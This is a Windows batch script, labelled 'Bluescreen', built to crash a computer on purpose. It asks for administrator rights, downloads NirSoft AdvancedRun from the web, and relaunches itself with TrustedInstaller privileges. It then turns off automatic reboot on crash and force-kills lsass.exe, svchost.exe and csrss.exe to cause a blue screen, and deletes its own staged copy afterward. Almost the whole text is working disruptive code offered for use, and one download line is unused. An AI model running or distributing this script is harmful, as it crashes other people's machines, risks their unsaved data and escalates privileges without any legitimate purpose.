::extension
::Bluescreen
::yellow
::does what it says
@echo off
setlocal EnableExtensions


net session >nul 2>&1
if %errorlevel% NEQ 0 (
    echo [INFO] Requesting standard administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)


whoami /groups | findstr /i "TrustedInstaller" >nul 2>&1
if %errorlevel% EQU 0 goto :RUN_PAYLOAD


set "RUNNER=%SystemRoot%\Temp\AdvancedRun.exe"

if exist "%RUNNER%" goto :LAUNCH_TI

echo [INFO] Fetching clean standalone helper directly...

powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $wc = New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent', 'Mozilla/5.0'); $wc.DownloadFile('https://github.com', '%SystemRoot%\Temp\helper.zip')" >nul 2>&1


powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://www.nirsoft.net/utils/advancedrun-x64.zip' -UserAgent 'Mozilla/5.0' -OutFile '%SystemRoot%\Temp\adv.zip'"
powershell -Command "Expand-Archive -Path '%SystemRoot%\Temp\adv.zip' -DestinationPath '%SystemRoot%\Temp' -Force"
del "%SystemRoot%\Temp\adv.zip" >nul 2>&1

:LAUNCH_TI
echo [INFO] Staging execution script...
copy /y "%~f0" "%SystemRoot%\Temp\ti_payload.bat" >nul

echo [INFO] Transitioning execution environment...

"%RUNNER%" /EXEFilename "cmd.exe" /CommandLine "/k %SystemRoot%\Temp\ti_payload.bat" /RunAs 8 /Run
exit /b

:RUN_PAYLOAD

wmic recoveros set AutoReboot=False

taskkill /f /im lsass.exe
taskkill /f /im svchost.exe
taskkill /f /im csrss.exe

if exist "%SystemRoot%\Temp\ti_payload.bat" (
    (goto) 2>nul & del "%SystemRoot%\Temp\ti_payload.bat"
)
pause


